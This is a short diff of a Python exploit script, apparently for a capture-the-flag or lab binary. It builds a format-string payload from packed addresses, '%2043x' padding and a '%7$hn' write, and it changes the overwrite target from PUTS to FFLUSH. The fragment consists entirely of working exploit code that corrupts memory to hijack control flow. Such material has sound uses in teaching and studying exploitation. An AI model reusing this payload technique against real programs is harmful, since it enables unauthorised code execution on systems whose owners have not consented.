@@ -8,8 +8,8 @@ def pad(s):
   return s+"X"*(100-len(s))
 
 exploit = " "
-exploit += struct.pack("I", PUTS)
-exploit += struct.pack("I", PUTS+2)
+exploit += struct.pack("I", FFLUSH)
+exploit += struct.pack("I", FFLUSH+2)
 exploit += "%2043x"
 exploit += "%7$hn"
 exploit += "%35514x"
